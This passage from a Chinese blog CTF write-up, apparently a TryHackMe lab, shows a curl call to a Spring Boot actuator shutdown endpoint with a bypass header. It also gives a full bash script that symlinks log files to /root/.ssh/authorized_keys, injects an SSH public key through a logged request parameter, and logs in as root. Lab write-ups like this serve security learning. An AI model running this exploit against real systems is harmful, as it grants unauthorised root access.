+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X &#x27;POST&#x27; -H &#x27;Content-Type: application/json&#x27; -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; &quot;https://10.10.75.74:443/actuator/shutdown&quot; -k</span><br></pre></td></tr></table></figure>
+<p>之中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@RestController</span><br><span class="line">  //https://spring.io/guides/gs/rest-service/</span><br><span class="line">  static class HelloWorldController &#123;</span><br><span class="line">      @RequestMapping(&quot;/&quot;)</span><br><span class="line">      public String hello(@RequestParam(value = &quot;name&quot;, defaultValue = &quot;World&quot;) String name) &#123;</span><br><span class="line">          System.out.println(name);</span><br><span class="line">          return String.format(&quot;Hello, %s!&quot;, name);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这个会写进日志里去</p>
+<p>不会了,先看,边看边学</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#generate ssh key if it does not exists</span><br><span class="line">[ -f ./key ] &amp;&amp; true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N &quot;&quot;</span><br><span class="line">#read public key</span><br><span class="line">pubkey=$(cat ./key.pub)</span><br><span class="line"></span><br><span class="line">#send a shutdown request to the spring boot server</span><br><span class="line">curl -X POST https://localhost/actuator/shutdown -H &#x27;x-9ad42dea0356cb04: 172.16.0.21&#x27; -k</span><br><span class="line"></span><br><span class="line">#get date as epoch format</span><br><span class="line">d=$(date &#x27;+%s&#x27;)</span><br><span class="line"></span><br><span class="line">#let&#x27;s assume 30 seconds is enough to restart the service</span><br><span class="line">for i in &#123;1..30&#125;</span><br><span class="line">do</span><br><span class="line"> #create symlinks to /root/.ssh/authorized_keys for 30 seconds</span><br><span class="line"> let time=$(( d + i ))</span><br><span class="line"> ln -s /root/.ssh/authorized_keys &quot;$time.log&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">#wait for app to restart</span><br><span class="line">sleep 30s</span><br><span class="line"></span><br><span class="line">#send publickey as name to the greating server</span><br><span class="line">curl --data-urlencode &quot;name=$pubkey&quot; https://localhost/ -k</span><br><span class="line">sleep 5s</span><br><span class="line"></span><br><span class="line">#connect as root</span><br><span class="line">ssh  -o &quot;StrictHostKeyChecking=no&quot; -i ./key root@localhost</span><br></pre></td></tr></table></figure>
+<p>靶机down了,再打一遍吧</p>
+<p>如果用http就是完美的一个靶场了,可惜唉<br>
+<code>curl https://10.10.52.116:443 -k</code>逆天了,https也不给自动443吗</p>
+<p>因为第一个shell堵塞了?所以卡死了?不明所以</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/Opacity2%20john,%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BC%B9shell,pypy%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1,keepassxc%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81/" title="Opacity2 john,文件上传反弹shell,pypy定时任务,keepassxc爆破密码"><img class="cover" src="/img/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Opacity2 john,文件上传反弹shell,pypy定时任务,keepassxc爆破密码</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/StuxCTF%20%E5%AF%86%E7%A0%81,%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="StuxCTF 密码,反序列化"><img class="cover" src="/img/10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">StuxCTF 密码,反序列化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>公告</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="复习一下反序列化 cc1-cc7"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7">复习一下反序列化 cc1-cc7</a><time datetime="2024-06-07T15:27:00.000Z" title="发表于 2024-06-07 23:27:00">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2024-06-07T15:26:21.000Z" title="发表于 2024-06-07 23:26:21">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo魔改"/></a><div class="content"><a class="title" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改">hexo魔改</a><time datetime="2024-06-07T15:21:11.000Z" title="发表于 2024-06-07 23:21:11">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题">无题</a><time datetime="2024-06-07T15:14:08.002Z" title="发表于 2024-06-07 23:14:08">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="login system"/></a><div class="content"><a class="title" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system">login system</a><time datetime="2024-06-07T13:37:43.000Z" title="发表于 2024-06-07 21:37:43">2024-06-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
